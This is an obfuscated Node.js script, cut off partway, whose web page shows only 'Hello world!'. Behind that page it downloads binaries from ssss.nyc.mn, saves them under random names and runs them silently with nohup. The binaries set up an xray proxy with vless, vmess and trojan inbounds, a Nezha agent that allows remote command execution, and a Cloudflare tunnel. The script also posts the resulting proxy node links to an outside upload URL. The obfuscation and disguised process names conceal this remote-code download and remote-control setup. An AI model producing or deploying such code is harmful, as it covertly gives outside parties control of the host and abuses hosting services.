const _0x20f165=_0x1f17;(function(_0x3a9c67,_0x38b5dc){const _0x3649b1={_0x590bc9:0x108,_0x580c40:0x167,_0x400f04:0x183,_0x611287:0x136,_0x4bdbe3:0x1a7,_0x2906d6:0xfa,_0x18c11f:0x10e},_0x17eab5=_0x1f17,_0x495b14=_0x3a9c67();while(!![]){try{const _0x323ed6=parseInt(_0x17eab5(_0x3649b1._0x590bc9))/0x1+parseInt(_0x17eab5(0x13e))/0x2*(-parseInt(_0x17eab5(0x159))/0x3)+-parseInt(_0x17eab5(0x161))/0x4+-parseInt(_0x17eab5(_0x3649b1._0x580c40))/0x5*(-parseInt(_0x17eab5(_0x3649b1._0x400f04))/0x6)+parseInt(_0x17eab5(_0x3649b1._0x611287))/0x7*(parseInt(_0x17eab5(_0x3649b1._0x4bdbe3))/0x8)+parseInt(_0x17eab5(_0x3649b1._0x2906d6))/0x9+-parseInt(_0x17eab5(0x142))/0xa*(-parseInt(_0x17eab5(_0x3649b1._0x18c11f))/0xb);if(_0x323ed6===_0x38b5dc)break;else _0x495b14['push'](_0x495b14['shift']());}catch(_0x446480){_0x495b14['push'](_0x495b14['shift']());}}}(_0x485f,0xdb28f));const express=require(_0x20f165(0x147)),app=express(),axios=require(_0x20f165(0x130)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_process')[_0x20f165(0x157)]),{execSync}=require(_0x20f165(0x18f)),UPLOAD_URL=process[_0x20f165(0x174)][_0x20f165(0xeb)]||'',PROJECT_URL=process[_0x20f165(0x174)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x20f165(0x174)][_0x20f165(0xee)]||![],FILE_PATH=process[_0x20f165(0x174)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x20f165(0x174)][_0x20f165(0x133)]||'skysub',PORT=process[_0x20f165(0x174)][_0x20f165(0x106)]||process[_0x20f165(0x174)][_0x20f165(0x138)]||0xbb8,UUID=process[_0x20f165(0x174)]['UUID']||_0x20f165(0x12a),NEZHA_SERVER=process[_0x20f165(0x174)][_0x20f165(0x193)]||'',NEZHA_PORT=process['env'][_0x20f165(0x128)]||'',NEZHA_KEY=process[_0x20f165(0x174)][_0x20f165(0x163)]||'',ARGO_DOMAIN=process[_0x20f165(0x174)][_0x20f165(0x175)]||'',ARGO_AUTH=process[_0x20f165(0x174)]['ARGO_AUTH']||'',ARGO_PORT=process['env'][_0x20f165(0x13a)]||0x1f41,CFIP=process['env'][_0x20f165(0x141)]||_0x20f165(0x180),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x20f165(0x174)][_0x20f165(0x10d)]||'';!fs[_0x20f165(0x12e)](FILE_PATH)?(fs[_0x20f165(0x135)](FILE_PATH),console['log'](FILE_PATH+_0x20f165(0xf7))):console[_0x20f165(0x18a)](FILE_PATH+_0x20f165(0x173));function generateRandomName(){const _0x250640={_0x582b29:0x112},_0x3ea8aa=_0x20f165,_0xcf7fc3=_0x3ea8aa(0x162);let _0x31c9eb='';for(let _0xe22e42=0x0;_0xe22e42<0x6;_0xe22e42++){_0x31c9eb+=_0xcf7fc3[_0x3ea8aa(_0x250640._0x582b29)](Math[_0x3ea8aa(0x19d)](Math[_0x3ea8aa(0x17d)]()*_0xcf7fc3['length']));}return _0x31c9eb;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x20f165(0x131)](FILE_PATH,botName),subPath=path[_0x20f165(0x131)](FILE_PATH,'sub.txt'),listPath=path[_0x20f165(0x131)](FILE_PATH,_0x20f165(0x121)),bootLogPath=path[_0x20f165(0x131)](FILE_PATH,_0x20f165(0xf2)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x100ecc={_0x27041d:0x194,_0x5e93a5:0x186,_0xe88bd1:0x150,_0x14caf1:0xf6},_0x3c2163=_0x20f165;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2d1de5;try{_0x2d1de5=fs['readFileSync'](subPath,_0x3c2163(0x115));}catch{return null;}const _0x1dbb0a=Buffer[_0x3c2163(0x139)](_0x2d1de5,'base64')[_0x3c2163(_0x100ecc._0x27041d)]('utf-8'),_0x5ea339=_0x1dbb0a[_0x3c2163(_0x100ecc._0x5e93a5)]('\x0a')['filter'](_0x1cf8c9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3c2163(0x10c)](_0x1cf8c9));if(_0x5ea339[_0x3c2163(0x16e)]===0x0)return;return axios[_0x3c2163(_0x100ecc._0xe88bd1)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x3c2163(0x148)]({'nodes':_0x5ea339}),{'headers':{'Content-Type':_0x3c2163(0x1a9)}})[_0x3c2163(_0x100ecc._0x14caf1)](_0x3cc8a7=>{return null;}),null;}catch(_0x2feca7){return null;}}function _0x485f(){const _0x3c4f11=['/api/add-nodes','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','basename','forEach','\x0a\x20\x20credentials-file:\x20','includes','1960200rpAOoV','abcdefghijklmnopqrstuvwxyz','NEZHA_KEY','/dev/null','\x20-s\x20','base64','2452135UxTbuk','2083','pop','ArgoDomain:','then','get','rm\x20-rf\x20','length','status','App\x20is\x20running','data','firefox','\x20already\x20exists','env','ARGO_DOMAIN','https://oooo.serv00.net/add-url','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','readdirSync','response','\x0avless://','Add\x20automatic\x20access\x20task\x20faild:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','random','https://amd64.ssss.nyc.mn/agent','&path=%2Fvless-argo%3Fed%3D2560#','vm20251016.qshy.eu.org','substring','tunnel.json','12tacvUs','nohup\x20','.exe\x20>\x20nul\x202>&1','split','Content-Type','https://ipapi.co/json/','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','log','platform','arch','2087','close','child_process','block','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','false','NEZHA_SERVER','toString','chmod','/vmess-argo','error','message','writeFileSync','direct','\x0aclient_secret:\x20','/vless-argo','floor','\x20is\x20running','tcp','https://arm64.ssss.nyc.mn/web','ARGO_DOMAIN:','amd','createWriteStream','Hello\x20world!','pkill\x20-f\x20\x22[','taskkill\x20/f\x20/im\x20','16YhMBZx','unshift','application/json','fileUrl','&fp=firefox&type=ws&host=','http','filter','send','/api/add-subscriptions','Download\x20','UPLOAD_URL','\x20failed:\x20','\x0a\x20\x20tunnel:\x20','AUTO_ACCESS','aarch64','stream','Error\x20reading\x20boot.log:','boot.log','?security=tls&sni=','Unhandled\x20error\x20in\x20startserver:','finish','catch','\x20is\x20created','countryCode','\x0a\x0atrojan://','9163386HyljuF','all','/trojan-argo','has','readFileSync','Empowerment\x20success\x20for\x20','https://arm64.ssss.nyc.mn/agent','Error\x20downloading\x20files:','2096','443','unlink','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','SERVER_PORT','quic','58718aykkJH','npm\x20running\x20error:\x20','/config.json\x20>/dev/null\x202>&1\x20&','win32','test','NAME','1141481bLXaaq','\x20>/dev/null\x202>&1','match','Subscription\x20uploaded\x20successfully','charAt','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Error\x20executing\x20command:\x20','utf-8','Nodes\x20uploaded\x20successfully','config.yaml','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20-c\x20\x22','http://ip-api.com/json/','\x20successfully','tls','statSync','\x20>/dev/null\x202>&1\x20&','https+local://8.8.8.8/dns-query','unlinkSync','list.txt','https://amd64.ssss.nyc.mn/v1','/sub.txt\x20saved\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/tunnel.yml\x20run','NEZHA_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ceaafe68-44b6-4b3b-94a5-25375c84eb2c','org','set','country_code','existsSync','\x22\x20>\x20/dev/null\x202>&1','axios','join','fileName','SUB_PATH','127.0.0.1','mkdirSync','3457013agqLAi','php\x20running\x20error:\x20','PORT','from','ARGO_PORT','web\x20running\x20error:\x20','2053','vless','10182bfhZvm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','none','CFIP','10qQsKMZ','xtls-rprx-vision','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','map','express','stringify','vmess','clear','Error\x20in\x20startserver:','https://amd64.ssss.nyc.mn/web','tunnel.yml','trojan','8443','post','&path=%2Ftrojan-argo%3Fed%3D2560#','https://arm64.ssss.nyc.mn/v1','push','TunnelSecret','NEZHA\x20variable\x20is\x20empty,skip\x20running','/vmess-argo?ed=2560','exec','isFile','1038kLRnsr','arm'];_0x485f=function(){return _0x3c4f11;};return _0x485f();}function cleanupOldFiles(){const _0x3ec5e3={_0x5077d8:0x178},_0x56ece9={_0x92fdf2:0x158},_0x191d60=_0x20f165;try{const _0x18fbf0=fs[_0x191d60(_0x3ec5e3._0x5077d8)](FILE_PATH);_0x18fbf0[_0x191d60(0x15e)](_0x3655a2=>{const _0x2190ba=_0x191d60,_0x374cfb=path['join'](FILE_PATH,_0x3655a2);try{const _0x2458d6=fs[_0x2190ba(0x11d)](_0x374cfb);_0x2458d6[_0x2190ba(_0x56ece9._0x92fdf2)]()&&fs[_0x2190ba(0x120)](_0x374cfb);}catch(_0x224208){}});}catch(_0x21a416){}}app[_0x20f165(0x16c)]('/',function(_0x8c273f,_0x596469){const _0x561017=_0x20f165;_0x596469[_0x561017(0xe8)](_0x561017(0x1a4));});async function generateConfig(){const _0x21dc56={_0x42b1a0:0x164,_0x2f26d1:0x164,_0x29d95c:0x140,_0x5bbf9e:0x13d,_0x51ed3f:0x19c,_0x2c9bc8:0x196,_0x1f83bc:0xfc,_0x20e6f8:0x19f,_0x3fb422:0x134,_0x3af0a3:0x13d,_0x554ed5:0xe6,_0x4aed7b:0x149,_0xa07e5b:0x11c,_0x624621:0x107,_0x4f036e:0x14e,_0x1e303d:0x11c,_0x44b209:0x107,_0x5d5558:0x11f,_0x50f964:0x131},_0x5a0362=_0x20f165,_0x42dbe8={'log':{'access':_0x5a0362(_0x21dc56._0x42b1a0),'error':_0x5a0362(_0x21dc56._0x2f26d1),'loglevel':_0x5a0362(_0x21dc56._0x29d95c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5a0362(_0x21dc56._0x5bbf9e),'settings':{'clients':[{'id':UUID,'flow':_0x5a0362(0x143)}],'decryption':_0x5a0362(_0x21dc56._0x29d95c),'fallbacks':[{'dest':0xbb9},{'path':_0x5a0362(_0x21dc56._0x51ed3f),'dest':0xbba},{'path':_0x5a0362(_0x21dc56._0x2c9bc8),'dest':0xbbb},{'path':_0x5a0362(_0x21dc56._0x1f83bc),'dest':0xbbc}]},'streamSettings':{'network':_0x5a0362(_0x21dc56._0x20e6f8)}},{'port':0xbb9,'listen':_0x5a0362(0x134),'protocol':_0x5a0362(0x13d),'settings':{'clients':[{'id':UUID}],'decryption':_0x5a0362(0x140)},'streamSettings':{'network':_0x5a0362(0x19f),'security':_0x5a0362(_0x21dc56._0x29d95c)}},{'port':0xbba,'listen':_0x5a0362(_0x21dc56._0x3fb422),'protocol':_0x5a0362(_0x21dc56._0x3af0a3),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5a0362(0x140)},'streamSettings':{'network':'ws','security':_0x5a0362(_0x21dc56._0x29d95c),'wsSettings':{'path':_0x5a0362(_0x21dc56._0x51ed3f)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a0362(_0x21dc56._0x554ed5),_0x5a0362(0x11c),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5a0362(_0x21dc56._0x4aed7b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5a0362(_0x21dc56._0x2c9bc8)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a0362(_0x21dc56._0x554ed5),_0x5a0362(_0x21dc56._0xa07e5b),_0x5a0362(_0x21dc56._0x624621)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5a0362(_0x21dc56._0x3fb422),'protocol':_0x5a0362(_0x21dc56._0x4f036e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5a0362(0x140),'wsSettings':{'path':_0x5a0362(0xfc)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a0362(0xe6),_0x5a0362(_0x21dc56._0x1e303d),_0x5a0362(_0x21dc56._0x44b209)],'metadataOnly':![]}}],'dns':{'servers':[_0x5a0362(_0x21dc56._0x5d5558)]},'outbounds':[{'protocol':'freedom','tag':_0x5a0362(0x19a)},{'protocol':'blackhole','tag':_0x5a0362(0x190)}]};fs[_0x5a0362(0x199)](path[_0x5a0362(_0x21dc56._0x50f964)](FILE_PATH,'config.json'),JSON['stringify'](_0x42dbe8,null,0x2));}function getSystemArchitecture(){const _0x538c1f={_0x35cf10:0x18c,_0x474ba3:0xef,_0x197b3a:0x15a,_0x501543:0x1a2},_0x8ab29a=_0x20f165,_0x2c7ebe=os[_0x8ab29a(_0x538c1f._0x35cf10)]();return _0x2c7ebe==='arm'||_0x2c7ebe==='arm64'||_0x2c7ebe===_0x8ab29a(_0x538c1f._0x474ba3)?_0x8ab29a(_0x538c1f._0x197b3a):_0x8ab29a(_0x538c1f._0x501543);}function downloadFile(_0x539479,_0x484950,_0x1ef425){const _0x371704={_0x4c3a6f:0xf0,_0x5e1138:0xf6},_0x3403fb={_0x10a4e3:0x15d},_0x4ff3c7={_0xc6a351:0xf5},_0x1f67d7={_0x1c7101:0xea,_0x3c105a:0x15d,_0x289c3e:0xec,_0x39d94b:0x198,_0x47d3bc:0x197},_0x422e40=_0x20f165,_0x55dd60=_0x539479;!fs[_0x422e40(0x12e)](FILE_PATH)&&fs[_0x422e40(0x135)](FILE_PATH,{'recursive':!![]});const _0x55ebfd=fs[_0x422e40(0x1a3)](_0x55dd60);axios({'method':_0x422e40(0x16c),'url':_0x484950,'responseType':_0x422e40(_0x371704._0x4c3a6f)})[_0x422e40(0x16b)](_0xfd19de=>{const _0x28b860={_0x10f3b3:0x18a,_0x3c1909:0x15d,_0x79dbee:0x11b},_0x4c199d=_0x422e40;_0xfd19de[_0x4c199d(0x171)]['pipe'](_0x55ebfd),_0x55ebfd['on'](_0x4c199d(_0x4ff3c7._0xc6a351),()=>{const _0x49faf9=_0x4c199d;_0x55ebfd[_0x49faf9(0x18e)](),console[_0x49faf9(_0x28b860._0x10f3b3)]('Download\x20'+path[_0x49faf9(_0x28b860._0x3c1909)](_0x55dd60)+_0x49faf9(_0x28b860._0x79dbee)),_0x1ef425(null,_0x55dd60);}),_0x55ebfd['on'](_0x4c199d(0x197),_0x4d4e2f=>{const _0x278695=_0x4c199d;fs[_0x278695(0x104)](_0x55dd60,()=>{});const _0x3d9667=_0x278695(_0x1f67d7._0x1c7101)+path[_0x278695(_0x1f67d7._0x3c105a)](_0x55dd60)+_0x278695(_0x1f67d7._0x289c3e)+_0x4d4e2f[_0x278695(_0x1f67d7._0x39d94b)];console[_0x278695(_0x1f67d7._0x47d3bc)](_0x3d9667),_0x1ef425(_0x3d9667);});})[_0x422e40(_0x371704._0x5e1138)](_0x4cf1b1=>{const _0x2bddbd=_0x422e40,_0x5237b0=_0x2bddbd(0xea)+path[_0x2bddbd(_0x3403fb._0x10a4e3)](_0x55dd60)+'\x20failed:\x20'+_0x4cf1b1[_0x2bddbd(0x198)];console['error'](_0x5237b0),_0x1ef425(_0x5237b0);});}async function downloadFilesAndRun(){const _0x4ab571={_0x64c220:0x177,_0x237b1a:0xfb,_0x571210:0x197,_0x1eb367:0x160,_0x8a16d7:0x103,_0x511f3d:0x168,_0x19e4d0:0x13c,_0x35de4e:0x144,_0x4dded1:0x117,_0x542ffc:0x184,_0x386935:0x145,_0x5978c3:0x19e,_0x165bc6:0x197,_0x12ea4f:0x184,_0x3bd4c0:0x165,_0x331473:0x126,_0xca8803:0x19e,_0x22de90:0x13b,_0x3e11c5:0x17c,_0x337062:0x11e,_0xe05c0c:0x114},_0x1bee16=_0x20f165,_0x5de3c8=getSystemArchitecture(),_0x131f69=getFilesForArchitecture(_0x5de3c8);if(_0x131f69[_0x1bee16(0x16e)]===0x0){console[_0x1bee16(0x18a)](_0x1bee16(_0x4ab571._0x64c220));return;}const _0x556636=_0x131f69[_0x1bee16(0x146)](_0x288e22=>{return new Promise((_0x3b1da1,_0x1e438e)=>{const _0x4b7ec7=_0x1f17;downloadFile(_0x288e22[_0x4b7ec7(0x132)],_0x288e22[_0x4b7ec7(0x1aa)],(_0x203c27,_0x2808ce)=>{_0x203c27?_0x1e438e(_0x203c27):_0x3b1da1(_0x2808ce);});});});try{await Promise[_0x1bee16(_0x4ab571._0x237b1a)](_0x556636);}catch(_0x55e5b7){console[_0x1bee16(_0x4ab571._0x571210)](_0x1bee16(0x101),_0x55e5b7);return;}function _0x3818d2(_0x316368){const _0x4dc145={_0x3be060:0x12e,_0x2b9d07:0x195},_0x519d2c=0x1fd;_0x316368['forEach'](_0x784b75=>{const _0x37abf6={_0x19cda6:0xff,_0x307364:0x194},_0x508577=_0x1f17;fs[_0x508577(_0x4dc145._0x3be060)](_0x784b75)&&fs[_0x508577(_0x4dc145._0x2b9d07)](_0x784b75,_0x519d2c,_0x2f9f4b=>{const _0x413d62=_0x508577;_0x2f9f4b?console['error']('Empowerment\x20failed\x20for\x20'+_0x784b75+':\x20'+_0x2f9f4b):console['log'](_0x413d62(_0x37abf6._0x19cda6)+_0x784b75+':\x20'+_0x519d2c[_0x413d62(_0x37abf6._0x307364)](0x8));});});}const _0x161efa=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3818d2(_0x161efa);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x45836d=NEZHA_SERVER[_0x1bee16(_0x4ab571._0x1eb367)](':')?NEZHA_SERVER[_0x1bee16(0x186)](':')[_0x1bee16(0x169)]():'',_0x3eb769=new Set([_0x1bee16(_0x4ab571._0x8a16d7),'8443',_0x1bee16(0x102),_0x1bee16(0x18d),_0x1bee16(_0x4ab571._0x511f3d),_0x1bee16(_0x4ab571._0x19e4d0)]),_0x5f12f0=_0x3eb769[_0x1bee16(0xfd)](_0x45836d)?'true':_0x1bee16(0x192),_0xf8b7a8=_0x1bee16(0x19b)+NEZHA_KEY+_0x1bee16(0x13f)+NEZHA_SERVER+_0x1bee16(0x113)+_0x5f12f0+_0x1bee16(_0x4ab571._0x35de4e)+UUID;fs[_0x1bee16(0x199)](path[_0x1bee16(0x131)](FILE_PATH,_0x1bee16(_0x4ab571._0x4dded1)),_0xf8b7a8);const _0x18a228=_0x1bee16(_0x4ab571._0x542ffc)+phpPath+_0x1bee16(0x119)+FILE_PATH+_0x1bee16(_0x4ab571._0x386935);try{await exec(_0x18a228),console[_0x1bee16(0x18a)](phpName+_0x1bee16(_0x4ab571._0x5978c3)),await new Promise(_0x515725=>setTimeout(_0x515725,0x3e8));}catch(_0x171287){console[_0x1bee16(_0x4ab571._0x165bc6)](_0x1bee16(0x137)+_0x171287);}}else{let _0x11c653='';const _0x26ba31=[_0x1bee16(0x103),_0x1bee16(0x14f),'2096','2087','2083',_0x1bee16(0x13c)];_0x26ba31[_0x1bee16(0x160)](NEZHA_PORT)&&(_0x11c653='--tls');const _0x141bed=_0x1bee16(_0x4ab571._0x12ea4f)+npmPath+_0x1bee16(_0x4ab571._0x3bd4c0)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x11c653+_0x1bee16(_0x4ab571._0x331473);try{await exec(_0x141bed),console['log'](npmName+_0x1bee16(0x19e)),await new Promise(_0x5a6921=>setTimeout(_0x5a6921,0x3e8));}catch(_0x4547b){console[_0x1bee16(_0x4ab571._0x571210)](_0x1bee16(0x109)+_0x4547b);}}}else console['log'](_0x1bee16(0x155));const _0x37a915=_0x1bee16(0x184)+webPath+'\x20-c\x20'+FILE_PATH+_0x1bee16(0x10a);try{await exec(_0x37a915),console[_0x1bee16(0x18a)](webName+_0x1bee16(_0x4ab571._0xca8803)),await new Promise(_0x5cc454=>setTimeout(_0x5cc454,0x3e8));}catch(_0x17c14a){console[_0x1bee16(_0x4ab571._0x571210)](_0x1bee16(_0x4ab571._0x22de90)+_0x17c14a);}if(fs[_0x1bee16(0x12e)](botPath)){let _0x5563f4;if(ARGO_AUTH[_0x1bee16(0x110)](/^[A-Z0-9a-z=]{120,250}$/))_0x5563f4=_0x1bee16(0x129)+ARGO_AUTH;else ARGO_AUTH[_0x1bee16(0x110)](/TunnelSecret/)?_0x5563f4='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1bee16(0x127):_0x5563f4=_0x1bee16(0x124)+FILE_PATH+_0x1bee16(_0x4ab571._0x3e11c5)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5563f4+_0x1bee16(_0x4ab571._0x337062)),console[_0x1bee16(0x18a)](botName+_0x1bee16(0x19e)),await new Promise(_0x12e964=>setTimeout(_0x12e964,0x7d0));}catch(_0x3e7e78){console['error'](_0x1bee16(_0x4ab571._0xe05c0c)+_0x3e7e78);}}await new Promise(_0x1bf5c1=>setTimeout(_0x1bf5c1,0x1388));}function getFilesForArchitecture(_0x39d3b4){const _0xdada9f={_0x491020:0x1a8,_0xb0f4f2:0x152},_0x20b527=_0x20f165;let _0x118dd;_0x39d3b4==='arm'?_0x118dd=[{'fileName':webPath,'fileUrl':_0x20b527(0x1a0)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x118dd=[{'fileName':webPath,'fileUrl':_0x20b527(0x14c)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x20f51e=_0x39d3b4==='arm'?_0x20b527(0x100):_0x20b527(0x17e);_0x118dd[_0x20b527(_0xdada9f._0x491020)]({'fileName':npmPath,'fileUrl':_0x20f51e});}else{const _0x266b59=_0x39d3b4==='arm'?_0x20b527(_0xdada9f._0xb0f4f2):_0x20b527(0x122);_0x118dd[_0x20b527(_0xdada9f._0x491020)]({'fileName':phpPath,'fileUrl':_0x266b59});}}return _0x118dd;}function argoType(){const _0x6611cc={_0x53c66d:0x18a,_0x49f537:0x160,_0x475378:0x154,_0x27f54d:0x131,_0x5f27c1:0x182,_0x5ed4b7:0x186,_0x516c54:0x15f,_0x171107:0x18a},_0x24670c=_0x20f165;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x24670c(_0x6611cc._0x53c66d)](_0x24670c(0x189));return;}if(ARGO_AUTH[_0x24670c(_0x6611cc._0x49f537)](_0x24670c(_0x6611cc._0x475378))){fs['writeFileSync'](path[_0x24670c(_0x6611cc._0x27f54d)](FILE_PATH,_0x24670c(_0x6611cc._0x5f27c1)),ARGO_AUTH);const _0x3e036d=_0x24670c(0xed)+ARGO_AUTH[_0x24670c(_0x6611cc._0x5ed4b7)]('\x22')[0xb]+_0x24670c(_0x6611cc._0x516c54)+path['join'](FILE_PATH,'tunnel.json')+_0x24670c(0x191)+ARGO_DOMAIN+_0x24670c(0x118)+ARGO_PORT+_0x24670c(0x125);fs['writeFileSync'](path['join'](FILE_PATH,_0x24670c(0x14d)),_0x3e036d);}else console[_0x24670c(_0x6611cc._0x171107)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x116511={_0x5f4635:0x18a,_0x1d6123:0xfe,_0x3ab584:0x131,_0x4dc718:0xf2,_0x7e66c:0x16e,_0x591988:0x16a,_0x4da3b7:0x15c,_0x4c6bf7:0x120,_0x95f48b:0x17c},_0x4de2b8={_0x2275c0:0x188,_0xb27e4a:0x171,_0x4dec72:0x12d,_0x2e7116:0x171,_0x20c63a:0x16c,_0x19cd4f:0x11a,_0x5a1d21:0x171,_0xd03039:0x12b},_0x4ecb2b={_0x503bcb:0x18b,_0x5968c5:0x10b,_0x53e010:0x1a6,_0x233756:0x185,_0x736b8e:0x1a5,_0x2ad469:0x112,_0x97f066:0x181,_0x49aa5b:0x12f},_0xbec486={_0x184af0:0x110,_0x5963e6:0x153},_0x5a843d=_0x20f165;let _0x20674a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x20674a=ARGO_DOMAIN,console[_0x5a843d(_0x116511._0x5f4635)](_0x5a843d(0x1a1),_0x20674a),await _0x5d0dea(_0x20674a);else try{const _0x5b7ef8=fs[_0x5a843d(_0x116511._0x1d6123)](path[_0x5a843d(_0x116511._0x3ab584)](FILE_PATH,_0x5a843d(_0x116511._0x4dc718)),_0x5a843d(0x115)),_0x409f5f=_0x5b7ef8[_0x5a843d(0x186)]('\x0a'),_0x7e12bc=[];_0x409f5f[_0x5a843d(0x15e)](_0x74ce2d=>{const _0x881bb8=_0x5a843d,_0x2088ec=_0x74ce2d[_0x881bb8(_0xbec486._0x184af0)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2088ec){const _0x281ac4=_0x2088ec[0x1];_0x7e12bc[_0x881bb8(_0xbec486._0x5963e6)](_0x281ac4);}});if(_0x7e12bc[_0x5a843d(_0x116511._0x7e66c)]>0x0)_0x20674a=_0x7e12bc[0x0],console[_0x5a843d(0x18a)](_0x5a843d(_0x116511._0x591988),_0x20674a),await _0x5d0dea(_0x20674a);else{console[_0x5a843d(_0x116511._0x5f4635)](_0x5a843d(_0x116511._0x4da3b7)),fs[_0x5a843d(_0x116511._0x4c6bf7)](path[_0x5a843d(0x131)](FILE_PATH,_0x5a843d(0xf2)));async function _0x12a9c3(){const _0x2acf37=_0x5a843d;try{process[_0x2acf37(_0x4ecb2b._0x503bcb)]===_0x2acf37(_0x4ecb2b._0x5968c5)?await exec(_0x2acf37(_0x4ecb2b._0x53e010)+botName+_0x2acf37(_0x4ecb2b._0x233756)):await exec(_0x2acf37(_0x4ecb2b._0x736b8e)+botName[_0x2acf37(_0x4ecb2b._0x2ad469)](0x0)+']'+botName[_0x2acf37(_0x4ecb2b._0x97f066)](0x1)+_0x2acf37(_0x4ecb2b._0x49aa5b));}catch(_0x13ab43){}}_0x12a9c3(),await new Promise(_0x478a75=>setTimeout(_0x478a75,0xbb8));const _0x29056a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5a843d(_0x116511._0x95f48b)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x29056a+_0x5a843d(0x11e)),console[_0x5a843d(_0x116511._0x5f4635)](botName+'\x20is\x20running'),await new Promise(_0x59abf7=>setTimeout(_0x59abf7,0xbb8)),await extractDomains();}catch(_0x59dbd7){console['error'](_0x5a843d(0x114)+_0x59dbd7);}}}catch(_0x1a73f){console['error'](_0x5a843d(0xf1),_0x1a73f);}async function _0x512d4e(){const _0x126d0b=_0x5a843d;try{const _0x2008ca=await axios[_0x126d0b(0x16c)](_0x126d0b(_0x4de2b8._0x2275c0),{'timeout':0xbb8});if(_0x2008ca['data']&&_0x2008ca[_0x126d0b(_0x4de2b8._0xb27e4a)][_0x126d0b(_0x4de2b8._0x4dec72)]&&_0x2008ca[_0x126d0b(_0x4de2b8._0x2e7116)]['org'])return _0x2008ca['data']['country_code']+'_'+_0x2008ca['data']['org'];}catch(_0x3be447){try{const _0x3b1627=await axios[_0x126d0b(_0x4de2b8._0x20c63a)](_0x126d0b(_0x4de2b8._0x19cd4f),{'timeout':0xbb8});if(_0x3b1627[_0x126d0b(0x171)]&&_0x3b1627['data']['status']==='success'&&_0x3b1627[_0x126d0b(_0x4de2b8._0x2e7116)][_0x126d0b(0xf8)]&&_0x3b1627[_0x126d0b(_0x4de2b8._0x5a1d21)][_0x126d0b(_0x4de2b8._0xd03039)])return _0x3b1627[_0x126d0b(0x171)][_0x126d0b(0xf8)]+'_'+_0x3b1627[_0x126d0b(0x171)][_0x126d0b(0x12b)];}catch(_0x17808a){}}return'Unknown';}async function _0x5d0dea(_0x12e972){const _0x4930ce=await _0x512d4e(),_0x1ca918=NAME?NAME+'-'+_0x4930ce:_0x4930ce;return new Promise(_0x28ec46=>{const 